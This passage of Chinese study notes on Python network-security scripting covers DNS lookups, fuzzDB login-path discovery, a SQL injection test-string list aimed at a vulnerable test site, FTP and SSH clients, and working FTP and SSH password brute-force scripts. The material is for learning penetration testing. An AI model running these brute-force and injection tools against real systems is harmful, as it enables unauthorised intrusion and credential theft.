
5. NS: 查詢對該網址負責DNS伺服器的名稱。  
6. TXT: TXT  紀錄可以儲存任意文字，有時候會除存所屬組織與地址，也常常包含DMARC and SPF 等網頁的hash驗證網頁是否被調包。  

(p.216)

### DNSPython

DNSPython這是一個開源的DNS查詢模塊。  
下載模塊:  
```
pip3 install dnspython
```

取得郵件伺服器資訊:  
```python
response_MX = dns.resolver.query('domain','MX')
```

查詢名稱伺服器:  
```python
response_NS = dns.resolver.query('domain','NS')
```

查詢IPv4:  
```python  
response_ipv4 = dns.resolver.query('domain','A')
```
查詢IPv6:
```python  
response_ipv6 = dns.resolver.query('domain','AAAA')
```

以下的範例用DNS查詢了幾個網站的IP，裡頭有書店歐萊禮,微軟,Yahoo...等等。  

```python
import dns.resolver
 
hosts = ["oreilly.com", "yahoo.com", "google.com", "microsoft.com", "cnn.com"]

for host in hosts:
    print(host)
    ip = dns.resolver.query(host, "A")
    for i in ip:
        print(i)
```
結果
```
oreilly.com
199.27.145.65
199.27.145.64
yahoo.com
98.137.11.163
98.137.11.164
74.6.143.25
74.6.143.26
74.6.231.20
74.6.231.21
google.com
172.217.160.110
microsoft.com
13.77.161.179
104.215.148.63
40.76.4.15
40.112.72.205
40.113.200.201
cnn.com
151.101.193.67
151.101.1.67
151.101.65.67
151.101.129.67
```
### 檢查網址是否屬於子網域

我們可以用下列函數檢查是否是子網域。

```
is_subdomain(網址)
```
這個函數來檢查是否是母網域
```
is_superdomain(網址)
```
舉例來說，python的網站的母網域:
```
python.org
```
它的子網域:
```
docs.python.org
```
網域要從後面開始看!
上述兩個網站都是org的子網域。
  
  
以下範例:  
```python
#!/usr/bin/env python

import argparse
import dns.name

def main(domain1, domain2):
    domain1 = dns.name.from_text(domain1)
    domain2 = dns.name.from_text(domain2)
    print("domain1 is subdomain of domain2: ", domain1.is_subdomain(domain2)) 
    print("domain1 is superdomain of domain2: ", domain1.is_superdomain(domain2))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Check 2 domains with dns Python')
    parser.add_argument('--domain1', action="store", dest="domain1",  default='python.org')
    parser.add_argument('--domain2', action="store", dest="domain2",  default='docs.python.org')
    given_args = parser.parse_args() 
    domain1 = given_args.domain1
    domain2 = given_args.domain2
    main (domain1, domain2)
```

### IP改成ReverseName
以下方法可以把IP改成ReverseName進行查詢
```python
import dns.reversename

domain = dns.reversename.from_address("74.6.143.25")
print("Reversename Domain :")
print(domain)
print(dns.reversename.to_address(domain))

```
結果是
```
25.143.6.74.in-addr.arpa.
74.6.143.25
```
25.143.6.74.in-addr.arpa就是ReverseName，用來反向進行查詢用的網址。  

### 較為完整的DNS查詢範例

```python
import dns.resolver

def main(domain):
    records = ['A','AAAA','NS','SOA','MX','TXT']
    for record in records:
        try:
            responses = dns.resolver.query(domain, record)
            print("\nRecord response ",record)
            print("-----------------------------------")
            for response in responses:
                print(response)
        except Exception as exception:
            print("Cannot resolve query for record",record)
            print("Error for obtaining record information:", exception)

if __name__ == '__main__':
	try:
		main('google.com')
	except KeyboardInterrupt:
		exit()
```
得到完整的關於google的DNS查詢結果:
```
Record response  A
-----------------------------------
172.217.160.110

Record response  AAAA
-----------------------------------
2404:6800:4008:802::200e

Record response  NS
-----------------------------------
ns3.google.com.
ns2.google.com.
ns1.google.com.
ns4.google.com.

Record response  SOA
-----------------------------------
ns1.google.com. dns-admin.google.com. 381621387 900 900 1800 60

Record response  MX
-----------------------------------
40 alt3.aspmx.l.google.com.
50 alt4.aspmx.l.google.com.
10 aspmx.l.google.com.
20 alt1.aspmx.l.google.com.
30 alt2.aspmx.l.google.com.

Record response  TXT
-----------------------------------
"MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB"
"globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8="
"apple-domain-verification=30afIBcvSuDV2PLX"
"google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o"
"facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95"
"docusign=1b0a6754-49b1-4db5-8540-d2c12664b289"
"v=spf1 include:_spf.google.com ~all"
"docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e"
"google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ"
```

<a href="#menu-location">跳到目錄</a>  

<span id="fuzzing-address-scan"></span>  

## fuzzing弱點位址掃描

(p.221)

fuzzing是一種測試的方法或程序，就是對軟體輸入模糊的或常見的一些錯誤格式，來測試軟體的安全性。  

此處用於網頁上頭進行fuzzing測試的方法，是把常見的登入頁面的網址試了試，就有可能發覺網頁隱藏的,可登入的網址。  

例如網站有時候會有"網址/login"或"網址/login.php"一類的檔名。有了這些可能的檔名我們就有機會一個一個嘗試，找出登入頁面。  

### fuzzing程序

fuzzing可以分為六個步驟:  

1. 選擇要fuzzing的程式，例如一個網頁。  
2. 識別出這個程式可以輸入哪些參數，例如一個登入會員的網頁可以輸入帳號,密碼。  
3. 建立fuzzing用的資料，例如大量的帳號密碼輸入混著SQL injection的SQL指令。  
4. 將fuzzing傳入程式裡頭。  
5. 確認哪些輸入導致了程式崩潰會顯示漏洞。  

### fuzzDB

fuzzDB則是裝著很多已知的攻擊模式的資料集，可以用於fuzzing檢查。  

fuzzDB:  
https://github.com/fuzzdb-project/fuzzdb  

<a href="#menu-location">跳到目錄</a>  

### fuzzDB發掘的登入頁面URI

這個範例是建立在，如果我們不清楚某個網站是否有某個"管理員登入頁面"  

我們可以手動嘗試在瀏覽器輸入  
```
網址/login.php
網址/login.asp
網址/login.jsp
...
```
但其實整個流程可以完全自動化完成這個作業。  

我們可以在這個網站找到可能的登入檔名：  
https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/Logins.txt  

以下的python程式可以讓其自動化進行嘗試:  

main.py  
```python
import requests

logins = []

# open file and read the content in a list
with open('Logins.txt', 'r') as filehandle:
    for line in filehandle:
        login = line[:-1]
        logins.append(login)

domain = "http://testphp.vulnweb.com"

for login in logins:
	print("Checking... "+ domain + login)
	response = requests.get(domain + login)
	if response.status_code == 200:
		print("Login resource detected: " +login)
```
然後要嘗試的檔案名稱  
Logins.txt
```
/admin
/Admin
/admin.asp
/admin.aspx
/admin.cfm
/admin.jsp
/admin.php
/Admin.php
/admin.php4
/admin.pl
/Admin.pl
/admin.py
/admin.rb
/administrator
/Administrator
/administrator.asp
/administrator.aspx
/administrator.cfm
/administrator.jsp
/administrator.php
/Administrator.php
/administrator.php4
/administrator.pl
/administrator.py
/Administrator.py
/administrator.rb
/admnistrator.php3
/cgi-bin/sqwebmail?noframes=1
/default.asp
/exchange/logon.asp
/gs/admin
/index.php?u=
/login
/Login
/login.asp
/login.aspx
/login.cfm
/login.php
/Login.php
/login.php3
/login.php4
/login.pl
/Login.pl
/login.py
/login.rb
/logon
/Logon
/logon.asp
/logon.aspx
/logon.jsp
/logon.php
/Logon.php
/logon.php3
/logon.php4
/logon.pl
/Logon.pl
/logon.py
/logon.rb
/typo3/in
/utilities/TreeView.asp
/webeditor.php
/exchange/logon.asp
/names.nsf?OpenDatabase
/Citrix/NFuse17/
/citrix/metaframe/default/
/Citrix/MetaFrameXP/
/phpmyadmin
/InfoViewApp/logon.jsp
/dana-na/auth/url_default/welcome.cgi
/src/login.php
```

<a href="#menu-location">跳到目錄</a>  

<span id="fuzzing-sql-scan"></span>  
### fuzzDB偵測SQL Injection漏洞

以下範例可以用廣泛有效的SQL Injection字串進行嘗試  

main.py
```python
import requests

domain = "http://testphp.vulnweb.com/listproducts.php?cat="

mysql_attacks = []

# open file and read the content in a list
with open('MySQL.txt', 'r') as filehandle:
    for line in filehandle:
        attack = line[:-1]
        mysql_attacks.append(attack)

for attack in mysql_attacks:
	print("Testing... "+ domain + attack)
	response = requests.get(domain + attack)
	if "mysql" in response.text.lower(): 
		print("Injectable MySQL detected")
		print("Attack string: "+attack)
```
MySQL.txt
```
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
1or1=1
1'or'1'='1
fake@ema'or'il.nl'='il.nl
```
<a href="#menu-location">跳到目錄</a>  

### 延伸閱讀

(p.227)

Shodan Developer API: https://developer.shodan.io/api  
Shodan API列表。  

BinaryEdge documentation API: https://docs.binaryedge.io/api-v2
BinaryEdge搜尋引擎的API列表。  

Wfuzz: https://github.com/xmendez/wfuzz  
一個基於python的Fuzzing工具

Dirhunt: https://github.com/Nekmo/dirhunt  
一個優化過的網頁爬蟲，可以避免用brute force法來找到各個頁面檔案。  

<a href="#menu-location">跳到目錄</a>  

<span id="python-ftp-sftp-ssh"></span>  

## 用Python與FTP,SFTP,SSH伺服器進行通訊  

(p.228)

本章節要事先安裝好的Python套件，用以下指令安裝:

```python
sudo apt-get install python3
sudo apt-get install python3-setuptools
sudo pip3 install paramiko
sudo pip3 install asyncssh
```
簡單說一下FTP，事實上FTP是以TCP協定明文(所以不太安全)的方式傳遞檔案的一種快速方法。  
一般來說都是通過 21 port來傳輸檔案。  


<span id="python-ftplib"></span>  
### 使用ftplib來進行FTP傳輸  

python已經自帶模塊ftplib了，所以不需要額外安裝。  

官方文檔:  
https://docs.python.org/3.7/library/ftplib.html  


其實基本的帳號密碼入十分的容易，僅僅要三行，以下用交互命令行展示:  

```
>>> from  ftplib import FTP
>>> ftp=FTP("172.17.0.2")
>>> ftp.login(user="ftpuser",passwd="123")
'230 Login successful.'
```
上頭我們見到的，FTP()會產生一個新的ftp傳輸物件。  

以下是個簡單的下載範例:
```python
import ftplib

FTP_SERVER_URL = '172.17.0.2'
DOWNLOAD_DIR_PATH = '/var/www'
DOWNLOAD_FILE_NAME = 'hi'
USER_NAME="ftpuser"
PASSWORD="123"

def ftp_file_download():
    ftp_client = ftplib.FTP(FTP_SERVER_URL)
    ftp_client.login(user=USER_NAME,passwd=PASSWORD)
    ftp_client.cwd(DOWNLOAD_DIR_PATH)
    try:
        with open(DOWNLOAD_FILE_NAME, 'wb') as file_handler:
            ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME
            ftp_client.retrbinary(ftp_cmd,file_handler.write)
            ftp_client.quit()
    except Exception as exception:
        print('File could not be downloaded:',exception)

if __name__ == '__main__':
    ftp_file_download()
```
另外retrlines()函數也可以達成下載的效果。  
此外我們注意到 ftp_cmd = 'RETR %s' %DOWNLOAD_FILE_NAME  這行，RETR是檢索檔案可以用於下載資料，LIST則是顯示檔案屬性，NLST則會只顯示檔案名稱。  

關於FTP的指令我們可以參考RFC文檔:  
https://www.w3.org/Protocols/rfc959/  

(p.234)  

我們也可以使用retrlines()方法來下載ftp伺服器中的檔案。  

```python
#!/usr/bin/env python3

from ftplib import FTP

#寫入本地hi檔案
def writeData(data):
	file_descryptor.write(data+"\n")

ftp_client=FTP('172.17.0.2')
ftp_client.login(user='ftpuser',passwd='123')
ftp_client.cwd('/var/www')

#本地打開一個hi檔案
file_descryptor=open('hi','wt')

ftp_client.retrlines('RETR hi',writeData)
file_descryptor.close()
ftp_client.quit()
```

(p.234)

但是如果檔案非常的大，一口氣讀到記憶體，然後在存入硬碟可能會遇上一個問題，如果在小型的伺服器或樹梅派上頭，或者是此刻運作大量的程式導致記憶體不足，就會導致程式崩潰。  

可能的解決方案之一就是，一次讀一個Byte然後寫入硬碟。  

以下是逐個byte讀取的範例:

```python
#!/usr/bin/env python3

from ftplib import FTP

ftp_client=FTP('ftp.be.debian.org')
ftp_client.login() #登入如果空白則代表匿名登入
ftp_client.cwd('/pub/linux/kernel/v5.x/')
ftp_client.voidcmd("TYPE I") #TYPE I為二進制傳輸，TYPE A為文本傳輸

#estsize代表整個檔案的大小
#datasock就如同一般的socket一樣，可以用recv函數接收，此處是一次接收兩bytes
datasock,estsize=ftp_client.ntransfercmd("RETR ChangeLog-5.0")
transbytes=0 #已經傳輸的大小

#打開本地檔案，並且將取得的Bytes寫入本地檔案
with open('ChangeLog-5.0','wb') as file_descryptor:
    while True:
        buffer=datasock.recv(2048)
        #如果傳到後來沒有任何Bytes則停止傳輸
        if not len(buffer):
            break
        file_descryptor.write(buffer)#寫入本地檔案
        transbytes +=len(buffer)
        print("Bytes received",transbytes,"Total",(estsize,100.0*float(transbytes)/float(estsize)),str('%'))

#關閉socket連線
datasock.close()
ftp_client.quit()
```
其它ftplib的功能函數:  

1. FTP.getwelcome(): 取得歡迎詞
2. FTP.pwd(): 取得當前路徑
3. FTP.cwd(path): 切換本地端，也就是非伺服器的客戶端的工作資料夾
4. FTP.dir(path): 列出資料夾清單
5. FTP.nlst(path): 列出資料夾的名稱清單
6. FTP.size(file): 列出我們要傳遞的檔案大小

以下為取得資料夾清單示範:
```python
#!/usr/bin/env python3

from ftplib import FTP

ftp_client=FTP('ftp.be.debian.org')
print("Server: ",ftp_client.getwelcome())#取得歡迎詞
print(ftp_client.login())
print("Files and directories in the root directory:")
ftp_client.dir()#取得資料夾清單

ftp_client.cwd('/pub/linux/kernel')#切到/pub/linux/kernel資料夾
files=ftp_client.nlst()#取得檔案名稱(不包含存取權限)
files.sort()#排序
print("%d files in /pub/linux/kernel directory:"%len(files))
for file in files:
	print(file)

ftp_client.quit()
```
以下為結果
```
#歡迎詞
Server:  220 ProFTPD Server (mirror.as35701.net) [::ffff:195.234.45.114]
230-Welcome to mirror.as35701.net.
230-
...

#資料夾清單
lrwxrwxrwx   1 ftp      ftp            16 May 14  2011 backports.org -> /backports.org/debian-backports
drwxr-xr-x   9 ftp      ftp          4096 Jun 29 02:33 debian
drwxr-sr-x   5 ftp      ftp          4096 Mar 13  2016 debian-backports
...

#資料夾名稱
COPYING
CREDITS
Historic
README
...
```

<a href="#menu-location">跳到目錄</a>  

<span id="python-ftplib-BruteForce"></span>  
### 使用ftplib來進行brute-force猜測FTP伺服器帳號密碼

我們要嘗試用brute-force某個ftp時，要建立兩個字典檔，一個是帳號，一個是密碼。  
並且嘗試將所有帳號密碼的排列組合列出來。  

下面是我們的資料夾構造:  
```
ftp_brute_force
├── ftp_brute_force.py
├── passwords.txt
└── users.txt
```
users.txt與passwords.txt分別是我們的帳號密碼字典檔。  

以下是我們取得帳號密碼嘗試連入FTP server的python腳本，這個腳本會採用多processes的方式，來加快速度。  
```python
import ftplib
import multiprocessing

#brute_force子程序
def brute_force(ip_address,user,password):
    ftp = ftplib.FTP(ip_address)
    try:
        print("Testing user {}, password {}".format(user, password))
        response = ftp.login(user=user,passwd=password)
        if "230" in response:
            print("[*]Successful brute force")
            print("User: "+ user + " Password: "+password)
        else:
            pass
    except Exception as exception:
        print('Connection error', exception)

#主函數
def main():
    #輸入目標伺服器
    ip_address = input("Enter IP address or host name:")
    #讀取帳號
    with open('users.txt','r') as users:
        users = users.readlines()
    #讀取密碼
    with open('passwords.txt','r') as passwords:
        passwords = passwords.readlines()
    #組合所有帳號密碼的可能性
    for user in users:
        for password in passwords:
            process = multiprocessing.Process(target=brute_force,
            args=(ip_address,user.rstrip(),password.rstrip(),))
            process.start()

if __name__ == '__main__':
    main()
```
我們來實測一下:
```
Enter IP address or host name:172.17.0.2
Testing user user1, password password1
...
Testing user ftpuser, password anonymous
Testing user ftpuser, password 123
[*]Successful brute force
User: ftpuser Password: 123
```
在一番十分費時的嘗試之後，猜到帳號是ftpuser，密碼是123。  

要注意的是，帳號跟密碼都一定要在字典檔裡頭，所以夠大夠準確的字典檔十分重要，但就算帳號密碼都在字典檔裡頭，最差的情況我們也要經過(帳號數量*密碼數量)次的猜測才能猜到，所以仍然是十分困難。  

<a href="#menu-location">跳到目錄</a>  

### 使用ftplib找出接受匿名登入的FTP server

參考書目列出兩個登入匿名FTP的範例，但是雨衣開始的範例十分接近，僅在下方列出:

第一個範例，並沒有設置在登入失敗後的反應機制，僅僅是列出其中的資料夾。  

ftp_list_server_anonymous.py  
```python
#!/usr/bin/env python3

import ftplib

FTP_SERVER_URL = 'ftp.be.debian.org'
DOWNLOAD_DIR_PATH = '/pub/linux/kernel/v5.x/'

def check_anonymous_connection(host, path):
    with ftplib.FTP(host, user="anonymous") as connection:
        print( "Welcome to ftp server ", connection.getwelcome())
        for name, details in connection.mlsd(path):
            print( name, details['type'], details.get('size') )

if __name__ == '__main__':
    check_anonymous_connection(FTP_SERVER_URL,DOWNLOAD_DIR_PATH)
```

這是第二個範例，使用except來捕捉匿名登入失敗的反應:

```python
#!/usr/bin/env python3

import ftplib

def anonymousLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        response = ftp.login('anonymous', 'anonymous')
        print(response)
        if "230 Anonymous access granted" in response:       
            print('\n[*] ' + str(hostname) +' FTP Anonymous Login Succeeded.')
            print(ftp.getwelcome())
            ftp.dir()
    except Exception as e:
        print(str(e))
        print('\n[-] ' + str(hostname) +' FTP Anonymous Login Failed.')

hostname = 'ftp.be.debian.org'
anonymousLogin(hostname)
```

<a href="#menu-location">跳到目錄</a>  

(p.241)  

<span id="about-ssh"></span>  
## 關於SSH

paramiko是模塊，可以輕鬆的用python存取SSH。  

SSH是目前最受歡迎的遠端控制Linux電腦的協定之一，同時使用對稱與非對稱加密(公鑰與私鑰)。  

除此之外，SSH提供保密,授權,與完整性受驗證的資料傳輸。  

SSH的公鑰和私鑰可以來自認證機構(CertificationAuthority，簡稱CA)，也可以來自ssh-keygen指令生成。  

當客戶端連上伺服器端時，伺服器的公鑰會儲存在以下檔案裡頭。
```
~/.ssh/known_hosts
```
大概長這樣
```
root@fa44313619cd:~/.ssh# cat known_hosts 
|1|PlWELc+Yp1nENXZmVJy5YY+3B4M=|/l4cd0BDuo94VnGpuiCYqiyBr6c= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLNuI0rOxYy2/yZBIbSGMx/EN3BY/IArAY1YAc8hdhb8etGRXKCRxJDcBjBoPHre5jSdUrVHM1UjWSSQo15IlB0=
```
除此之外，SSH預設偵聽22 port。  

<a href="#menu-location">跳到目錄</a>  

<span id="ubuntu-debian-install-ssh-server"></span>  
## Ubuntu與Debian安裝SSH伺服器與設置用戶

更新套件清單
```
apt update
```

安裝SSH伺服器
```
apt install openssh-server
```

啟動ssh伺服器(服務)
```
service ssh start
```

其實照理來說這樣就可以了，不過我們預設之下無法用root權限登入伺服器，基於安全起見。  
所以我們可以設置一個ssh專用的帳號。  

補充一下/etc/ssh裡頭儲存著伺服器的公鑰私鑰。

帳號名稱就是sshuser好了。  

```
useradd -m sshuser
```

然後設置密碼  
```
passwd sshuser
```
這樣就可以了。  

假設我們的IP是內網的172.17.0.2，使用者sshuser要連上來要用這個指令。  
```
ssh sshuser@172.17.0.2
```
然後輸入密碼就能登入sshuser使用者的Home資料夾了。  

(p.243)  

<a href="#menu-location">跳到目錄</a>  

<span id="python-paramiko"></span>  
## 使用paramiko自動化執行SSH腳本

paramiko是個python模塊，可以自動執行SSH腳本，支援SSHV1 and SSHV2兩個版本。  

**注意!paramiko如果需要依賴 pycrypto 與 cryptography函數庫來達成額外的加密選項與dynamic encrypted tunnels。**  

關於openssh伺服器軟體的細節可以看看下列文檔:  
https://www.openssh.com/manual.html  

SSHV2大致上支援更多更安全的加密方式與DSA數位簽章。  

paramiko模塊與PuTTY與PuTTY能達到等同的功能，十分方便而且健壯。  

並且支持SFTP檔案傳輸格式。  

---

安裝paramiko
```
pip3 install paramiko
```
(p.244)
以下為程式範例:
```python
import paramiko
import socket

#put data about your ssh server
host = '172.17.0.2'
username = 'ftpuser'
password = '123'

try:
    ssh_client = paramiko.SSHClient()
    #顯示Debug內容
    paramiko.common.logging.basicConfig(level=paramiko.common.DEBUG)

    #將SSH伺服器公鑰放入 know_hosts 檔案
    ssh_client.load_system_host_keys()

    #如果沒有伺服器金鑰，也就是第一次連上時，自動儲存金鑰
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #登入
    response = ssh_client.connect(host, port = 22, username = username, password = password)
    print('\n[+]connected with host on port 22\n',response)

    #顯示安全選項
    transport = ssh_client.get_transport()
    security_options = transport.get_security_options()
    print('\n\n[+]security_options:key')
    print(security_options.kex)
    print('\n\n[+]security_options:ciphers')
    print(security_options.ciphers)

#錯誤捕捉
except paramiko.BadAuthenticationType as exception:#認證失敗
    print("BadAuthenticationException:",exception)
except paramiko.SSHException as sshException:#SSH錯誤
    print("SSHException:",sshException)
except socket.error as  socketError:#socket錯誤
    print("socketError:",socketError)
#無論成功或失敗，最後關閉連線
finally:
    print("closing connection")
    ssh_client.close()
    print("closed")
```
第一次連線時，本機會以上述腳本除存伺服器的fingerprint(指紋，或說識別特徵)  

如果你不希望連上沒有金鑰的伺服器，你可以把上述的  
```
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```
改成  
```
ssh_client.load_system_host_keys()
```

**有完值整輸出輸入範例**
```python
#!/usr/bin/env python3

import getpass
import paramiko

HOSTNAME = '172.17.0.2'
PORT = 22

#SSH執行指令函數
def run_ssh_cmd(username, password, command, hostname=HOSTNAME,port=PORT):
    #取得paramiko實例
    ssh_client = paramiko.SSHClient()

    #支援重頭取得伺服器公鑰
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.load_system_host_keys()

    #連上客戶端
    ssh_client.connect(hostname, port, username, password)

    #取得執行指令後的回傳值
    stdin, stdout, stderr = ssh_client.exec_command(command)
    #print(stdout.read())

    #關閉輸入
    stdin.close()

    #分行印出指令回傳值
    for line in stdout.read().splitlines():
        print(line.decode())

if __name__ == '__main__':
    hostname = input("Enter the target hostname: ")
    port = input("Enter the target port: ")
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    command = input("Enter command: ")
    run_ssh_cmd(username, password, command)
```
另外還有
**paramiko.Transport()**
方法，雖然功能跟上方一樣，但是提供另外一個軟體界面操作登入與輸入指令。  

**paramiko.Transport方法範例**
```python
#!/usr/bin/env python3

import paramiko
import getpass

def run_ssh_command(hostname, user, passwd, command):

    #建立Transport實例
    transport = paramiko.Transport(hostname)
    try:
        transport.start_client()
    except Exception as e:#連線失敗列出原因
        print(e)
    
    #以帳號密碼登入
    try:
        transport.auth_password(username=user,password=passwd)
    except Exception as e:#連線失敗列出原因
        print(e)

    #如果Transport登入成功
    if transport.is_authenticated():
        print("SSH server name:",transport.getpeername())
        channel = transport.open_session()
        channel.exec_command(command)
        response = (channel.recv(1024)).decode('UTF-8')
        print('Command %r(%r)-->%s' % (command,user,response))

if __name__ == '__main__':
    hostname = input("Enter the target hostname: ")
    port = input("Enter the target port: ")
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    command = input("Enter command: ")
    run_ssh_command(hostname,username, password, command)
```

<a href="#menu-location">跳到目錄</a>  

<span id="ssh-brute-force-paramiko"></span>  
## 使用paramiko進行SSH Brute Force

檔案配置:
```
brute_force
├── users.txt
├── passwords.txt
└── ssh_brute_force.py
```
users.txt與passwords.txt分別是帳號密碼字典檔。  

而下列程式，簡單來說就是把所有可能的組合進行嘗試。  

**ssh_brute_force.py**
```python
import paramiko
import socket
import time

def brute_force_ssh(hostname,port,user,password):
    log = paramiko.util.log_to_file('log.log')
    ssh_client = paramiko.SSHClient()
    ssh_client.load_system_host_keys()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print('Testing credentials {}:{}'.format(user,password))
        ssh_client.connect(hostname,port=port,username=user,password=password, timeout=5)
        print('credentials ok {}:{}'.format(user,password))
    except paramiko.AuthenticationException as exception:
        print('AuthenticationException:',exception)
    except socket.error as error:
        print('SocketError:',error)


def main():
    hostname = input("Enter the target hostname: ")
    port = input("Enter the target port: ")
    users = open('users.txt','r')
    users = users.readlines()
    passwords = open('passwords.txt','r')
    passwords = passwords.readlines()

    for user in users:
        for password in passwords:
            time.sleep(1)
            brute_force_ssh(hostname,port,user.rstrip(),password.rstrip())


if __name__ == '__main__':
    main()
```
(p.252)  

<a href="#menu-location">跳到目錄</a>  

<span id="about-pysftp-paramiko"></span>  
## paramiko與pysftp

pysftp包裝著paramiko模塊，提供了許多方便的方法函數，可以簡單的操作SSH。  

安裝:
```
pip3 install pysftp
```

詳細請參見官方網站:  
https://pysftp.readthedocs.io/en/release_0.2.9/  

```python
import pysftp
import getpass

HOSTNAME = 'localhost'
PORT = 22

def sftp_getfiles(username, password, hostname=HOSTNAME,port=PORT):
    with pysftp.Connection(host=hostname, username=username, password=password) as sftp:
        print("Connection successfully established with server... ")
        try:
            sftp.cwd('/')#切到該路徑，請確保你的ssh帳號有該路徑的存取權限，否則會出錯
            list_directory = sftp.listdir_attr()#列出資料夾，會回傳一個list
        except Exception as e:
            print("Permission denied 權限不足，存取被拒絕\n,e")
            exit()
        #列出資料夾清單
        for directory in list_directory:
            print(directory.filename, directory)

if __name__ == '__main__':
	hostname = input("Enter the target hostname: ")
	port = input("Enter the target port: ")
	username = input("Enter your username: ")
	password = getpass.getpass(prompt="Enter your password: ")
	sftp_getfiles(username, password, hostname, port)
```

(p.253)
<a href="#menu-location">跳到目錄</a>  

<span id="asyncSSH-SSH-client"></span>  
## 用asyncSSH來實做SSH客戶端

asyncSSH模塊提供SSHv2協定，並且藉由asyncio來進行異步IO傳輸，也就是在網路I/O等待時，可以運作其他程式的部份。此模塊需要cryptography模塊來處理一些加密內容。  

安裝asyncSSH  
```
pip3 install cryptography
pip3 install asyncSSH
```

客戶端:
```python
import asyncssh
import asyncio
import getpass

async def execute_command(host, command, username, password):
    async with asyncssh.connect(host, username = username, password= password) as connection:
        result = await connection.run(command)
        return result.stdout

if __name__ == '__main__':
    hostname = input("Enter the target hostname: ")
    command = input("Enter command: ")
    username = input("Enter username: ")
    password = getpass.getpass(prompt="Enter password: ")
    loop = asyncio.get_event_loop()
    output_command = loop.run_until_complete(execute_command(hostname, command, username, password))
    print(output_command)
```

<a href="#menu-location">跳到目錄</a>  

<span id="ssh-audit"></span>  
## 安裝ssh-audit來檢查SSH server的配置

安裝套件(Ubuntu或Debian)
```
apt install ssh-audit
```

如果套件庫沒有的話，可以直接Github下載：  
 https://github.com/jtesta/ssh-audit  

這個套件是由python撰寫而成，用來檢查SSH伺服器的配置。  

如果要檢查某個SSH伺服器的配置可以用以下輸入
```
ssh-audit 伺服器IP位址
```
例如我們今天要檢查本機的SSH的配置
```
ssh-audit 127.0.0.1
```
這些訊息都來自伺服器的login banner訊息  
當我們在使用比較不安全的協定，例如SSH1的時候，會得到告知。  

這個程式還可以順便檢查鑰匙交換演算法。  

我們來分析一下結果

```
root@763f47dd69d9:/etc/ssh# ssh-audit -2  127.0.0.1 

#一般訊息
# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.3+, Dropbear SSH 2016.73+
(gen) compression: enabled (zlib@openssh.com)

#鑰匙交換算法(注意，有很歷史上重要的Diffie-Hellman 鑰匙交換法)
# key exchange algorithms
(kex) curve25519-sha256                     -- [warn] unknown algorithm
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62
(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3
...

#主機金鑰算法
# host-key algorithms
(key) rsa-sha2-512                          -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256                          -- [info] available since OpenSSH 7.2
...

#訊息鑑別碼算法(簡稱MAC)(用來檢查訊息是否被竄改過)
# message authentication code algorithms
(mac) umac-64-etm@openssh.com               -- [warn] using small 64-bit tag size
                                            `- [info] available since OpenSSH 6.2
(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
...

#演算法建議(此處似乎是建議移除的演算法)
# algorithm recommendations (for OpenSSH 8.2)
(rec) -diffie-hellman-group-exchange-sha256 -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove 
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove 
(rec) -hmac-sha1                            -- mac algorithm to remove 


```

<a href="#menu-location">跳到目錄</a>  

<span id="Rebex_SSH_Check"></span>  
## Rebex SSH Check網站檢查SSH安全性

如果無法用套件完成SSH安全性檢查，可以透過這個網站檢查:  
https://sshcheck.com

<a href="#menu-location">跳到目錄</a>  

## SSH相關的進階閱讀

AsyncSSH 伺服器範例:   
https://asyncssh.readthedocs.io/en/stable/#server-examples

SSH tunnel安全通訊相關資訊:  
https://pypi.org/project/sshtunnel  

SSH tunnel安全通訊相關範例與實做:  
https://github.com/pahaz/sshtunnel  

(p.262)

<a href="#menu-location">跳到目錄</a>  

<span id="nmap-about"></span>  
# NMAP掃描主機

NMAP是個網路掃描工具，可以用各種方式，甚至相對無痕的方式來找出特定IP上的主機，甚至特定主機是否有程式在監聽某個port，到某個特定主機的作業系統。  

python中的NMAP模塊包裝著，NMAP的完整功能，可以直接自動化的完成掃描。  

對NMAP來說port分為三種狀態

1. open:        打開的port，有某個程式正在監聽這個port，並且準備回應，例如nginx網頁伺服器。  

2. closed:      關閉的port，主動告訴你，這個port關閉了，拒絕連線，不過由於主機還是會回應"這個IP存在著一台主機！"，有時候甚至會自己說明主機的作業系統與版本。  

